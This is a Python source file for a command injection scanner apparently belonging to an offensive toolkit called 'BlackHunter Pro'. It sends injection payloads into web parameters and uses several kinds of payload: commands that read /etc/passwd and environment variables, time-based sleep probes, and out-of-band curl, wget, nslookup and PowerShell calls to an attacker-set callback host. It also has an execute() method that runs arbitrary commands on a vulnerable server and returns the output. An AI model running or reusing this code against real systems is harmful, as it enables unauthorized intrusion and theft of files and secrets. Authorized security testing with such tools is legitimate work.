# vulns/cmdi.py
# BlackHunter Pro - Command Injection Scanner
# Detects: OS Command Injection (Linux, Windows, Blind, Time-based)

import re
import time
import requests
from urllib.parse import urlparse, urljoin, parse_qs, quote
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class CMDInjectScanner:
    """
    OS Command Injection Scanner
    - Basic command injection (Linux + Windows)
    - Time-based blind detection
    - Out-of-Band detection (DNS/HTTP)
    - Filter bypass techniques
    """

    # =============================================
    # COMMAND SEPARATORS
    # =============================================

    SEPARATORS = [
        ';', '|', '||', '&', '&&', '\n', '\r\n',
        '`', '$(', '${IFS}',
    ]

    # =============================================
    # DETECTION COMMANDS
    # =============================================

    LINUX_COMMANDS = [
        ('id', [r'uid=\d+', r'gid=\d+', r'groups=\d+']),
        ('whoami', [r'^(root|www-data|apache|nginx|nobody|user)$']),
        ('uname', [r'Linux', r'Darwin', r'BSD']),
        ('hostname', [r'^[a-zA-Z0-9\-\.]+$']),
        ('pwd', [r'^/']),
        ('ls', [r'^total \d+', r'^[d-][rwx-]{9}']),
        ('cat /etc/passwd', [r'root:x:0:0', r'daemon:x:']),
        ('env', [r'PATH=', r'HOME=']),
    ]

    WINDOWS_COMMANDS = [
        ('whoami', [r'\\', r'nt authority', r'administrator']),
        ('dir', [r'Volume in drive', r'Directory of', r'<DIR>']),
        ('ver', [r'Microsoft Windows', r'\[Version']),
        ('ipconfig', [r'Windows IP Configuration', r'IPv4 Address']),
        ('systeminfo', [r'Host Name', r'OS Name', r'OS Version']),
        ('tasklist', [r'Image Name', r'PID', r'Session Name']),
    ]

    # =============================================
    # TIME-BASED PAYLOADS
    # =============================================

    LINUX_TIME = [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("|| sleep 5", 5),
        ("& sleep 5", 5),
        ("&& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("; ping -c 5 127.0.0.1", 5),
        ("; timeout 5", 5),
        ("; perl -e 'sleep 5'", 5),
        ("; python -c 'import time; time.sleep(5)'", 5),
        ("; php -r 'sleep(5);'", 5),
    ]

    WINDOWS_TIME = [
        ("& timeout /t 5", 5),
        ("| timeout /t 5", 5),
        ("& ping -n 5 127.0.0.1", 5),
        ("& powershell -c \"Start-Sleep -s 5\"", 5),
    ]

    # =============================================
    # OOB PAYLOADS
    # =============================================

    OOB_PAYLOADS = [
        "; nslookup {token}.{callback}",
        "| nslookup {token}.{callback}",
        "& nslookup {token}.{callback}",
        "&& nslookup {token}.{callback}",
        "`nslookup {token}.{callback}`",
        "$(nslookup {token}.{callback})",
        "; curl http://{callback}/{token}",
        "| curl http://{callback}/{token}",
        "& curl http://{callback}/{token}",
        "; wget http://{callback}/{token}",
        "| wget http://{callback}/{token}",
        "; ping -c 1 {token}.{callback}",
        "& ping -n 1 {token}.{callback}",
        "; powershell -c \"IWR http://{callback}/{token}\"",
    ]

    # =============================================
    # BYPASS TECHNIQUES
    # =============================================

    BYPASSES = [
        '${IFS}', '$IFS', '%09', '%20',
        '{cmd,}', '\\n', '\\t', '<',
    ]

    # =============================================
    # CMDI-PRONE PARAMETERS
    # =============================================

    CMDI_PARAMS = [
        'cmd', 'command', 'exec', 'execute', 'run', 'system', 'shell',
        'ping', 'host', 'ip', 'address', 'domain', 'target', 'url',
        'file', 'filename', 'path', 'dir', 'folder', 'process',
        'proc', 'pid', 'service', 'action', 'do', 'func', 'function',
        'method', 'task', 'job', 'query', 'search', 'name', 'user',
        'username', 'input', 'data', 'param', 'arg', 'option', 'flag',
        'test', 'debug', 'log', 'output', 'result', 'callback',
    ]

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.executed_commands = []
        self._baseline_time = 1
        self.callback_domain = None

    # =============================================
    # SET CALLBACK
    # =============================================

    def set_callback(self, domain):
        """Set callback domain for OOB testing"""
        self.callback_domain = domain
        print(f"{Fore.GREEN}[+] Callback: {domain}")

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute command injection detection"""
        print(f"{Fore.CYAN}[*] Command Injection Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print()

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            params = self._find_form_params()

        if not params:
            print(f"{Fore.YELLOW}  [-] No parameters found")
            return []

        cmdi_params = {k: v for k, v in params.items()
                       if any(name in k.lower() for name in self.CMDI_PARAMS)}

        if not cmdi_params:
            cmdi_params = params

        print(f"{Fore.CYAN}[*] Testing {len(cmdi_params)} parameters: {', '.join(cmdi_params.keys())}")
        print()

        self._get_baseline()

        for param in cmdi_params.keys():
            print(f"{Fore.YELLOW}[*] Testing parameter: {param}")
            self._test_parameter(param)

        return self.vulnerabilities

    # =============================================
    # FIND FORM PARAMS
    # =============================================

    def _find_form_params(self):
        """Find parameters from forms"""
        params = {}
        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.IGNORECASE | re.DOTALL)

            for form in forms:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form, re.IGNORECASE)
                for inp in inputs:
                    params[inp] = '1'
        except:
            pass
        return params

    # =============================================
    # BASELINE
    # =============================================

    def _get_baseline(self):
        """Get baseline response time"""
        try:
            start = time.time()
            self.session.get(self.target, timeout=self.timeout, verify=False)
            self._baseline_time = max(time.time() - start, 1)
        except:
            self._baseline_time = 1

    # =============================================
    # TEST PARAMETER
    # =============================================

    def _test_parameter(self, param):
        """Test single parameter"""

        # 1. Basic injection
        if self._test_basic(param):
            return

        # 2. Time-based
        if self._test_time_based(param):
            return

        # 3. Windows
        if self._test_windows(param):
            return

    # =============================================
    # BASIC INJECTION
    # =============================================

    def _test_basic(self, param):
        """Test basic command injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for cmd, patterns in self.LINUX_COMMANDS:
            for sep in self.SEPARATORS[:6]:
                try:
                    payload = f"{sep}{cmd}"

                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = test_params.get(param, '1') + payload

                    r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                    evidence = self._check_output(r.text, patterns)

                    if evidence:
                        print(f"{Fore.RED}  [!] Command Injection Found!")
                        print(f"{Fore.RED}      Param: {param}")
                        print(f"{Fore.RED}      Payload: {payload}")
                        print(f"{Fore.RED}      Evidence: {evidence[:60]}")

                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': r.url,
                            'param': param,
                            'payload': payload,
                            'command': cmd,
                            'evidence': evidence[:500],
                            'severity': 'CRITICAL',
                        })
                        return True
                except:
                    continue

        return False

    # =============================================
    # TIME-BASED
    # =============================================

    def _test_time_based(self, param):
        """Test time-based blind injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        all_payloads = self.LINUX_TIME + self.WINDOWS_TIME

        for payload, delay in all_payloads:
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = test_params.get(param, '1') + payload

                start = time.time()
                r = self.session.get(
                    base_url,
                    params=test_params,
                    timeout=self.timeout + delay + 5,
                    verify=False
                )
                elapsed = time.time() - start

                if elapsed >= (self._baseline_time + delay - 1):
                    print(f"{Fore.RED}  [!] Command Injection (Time-based)")
                    print(f"{Fore.RED}      Param: {param}")
                    print(f"{Fore.RED}      Payload: {payload}")
                    print(f"{Fore.RED}      Delay: {elapsed:.2f}s")

                    self.vulnerabilities.append({
                        'type': 'Command Injection (Time-based)',
                        'url': r.url,
                        'param': param,
                        'payload': payload,
                        'delay': elapsed,
                        'severity': 'CRITICAL',
                    })
                    return True

            except requests.Timeout:
                print(f"{Fore.RED}  [!] Command Injection (Timeout)")
                print(f"{Fore.RED}      Param: {param}")
                print(f"{Fore.RED}      Payload: {payload}")

                self.vulnerabilities.append({
                    'type': 'Command Injection (Time-based)',
                    'url': self.target,
                    'param': param,
                    'payload': payload,
                    'delay': 'timeout',
                    'severity': 'CRITICAL',
                })
                return True
            except:
                continue

        return False

    # =============================================
    # WINDOWS
    # =============================================

    def _test_windows(self, param):
        """Test Windows-specific injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for cmd, patterns in self.WINDOWS_COMMANDS:
            for sep in self.SEPARATORS[:6]:
                try:
                    payload = f"{sep}{cmd}"

                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = test_params.get(param, '1') + payload

                    r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                    evidence = self._check_output(r.text, patterns)

                    if evidence:
                        print(f"{Fore.RED}  [!] Command Injection (Windows)")
                        print(f"{Fore.RED}      Param: {param}")
                        print(f"{Fore.RED}      Payload: {payload}")

                        self.vulnerabilities.append({
                            'type': 'Command Injection (Windows)',
                            'url': r.url,
                            'param': param,
                            'payload': payload,
                            'command': cmd,
                            'evidence': evidence[:500],
                            'severity': 'CRITICAL',
                        })
                        return True
                except:
                    continue

        return False

    # =============================================
    # OOB TEST
    # =============================================

    def test_oob(self, param):
        """Test out-of-band command injection"""
        if not self.callback_domain:
            print(f"{Fore.YELLOW}  [!] No callback domain set")
            return False

        import uuid

        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for payload_template in self.OOB_PAYLOADS:
            token = uuid.uuid4().hex[:12]
            payload = payload_template.format(token=token, callback=self.callback_domain)

            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = test_params.get(param, '1') + payload

                self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                print(f"{Fore.YELLOW}  [*] OOB test sent: {token}")

                self.vulnerabilities.append({
                    'type': 'Command Injection (OOB)',
                    'url': self.target,
                    'param': param,
                    'payload': payload,
                    'token': token,
                    'callback': f"{token}.{self.callback_domain}",
                    'verified': False,
                    'severity': 'CRITICAL',
                })
            except:
                continue

        return True

    # =============================================
    # EXECUTE COMMAND
    # =============================================

    def execute(self, param, command, separator=';'):
        """Execute a command on target"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        try:
            payload = f"{separator}{command}"

            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = test_params.get(param, '1') + payload

            r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

            print(f"{Fore.RED}  [!] Executed: {command}")
            print(f"{Fore.CYAN}      Output: {r.text[:200]}")

            self.executed_commands.append({
                'command': command,
                'output': r.text[:500],
            })

            return r.text
        except Exception as e:
            print(f"{Fore.RED}  [!] Execution failed: {e}")
            return None

    # =============================================
    # OUTPUT CHECK
    # =============================================

    def _check_output(self, response_text, patterns):
        """Check response for command output"""
        for pattern in patterns:
            match = re.search(pattern, response_text, re.MULTILINE)
            if match:
                return match.group(0)
        return None

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  COMMAND INJECTION SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Vulnerabilities:     {len(self.vulnerabilities)}")
        print(f"{Fore.GREEN}[+] Commands Executed:   {len(self.executed_commands)}")

        for v in self.vulnerabilities:
            print(f"{Fore.RED}[!] {v['type']} - {v.get('param', 'N/A')}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["CMDInjectScanner"]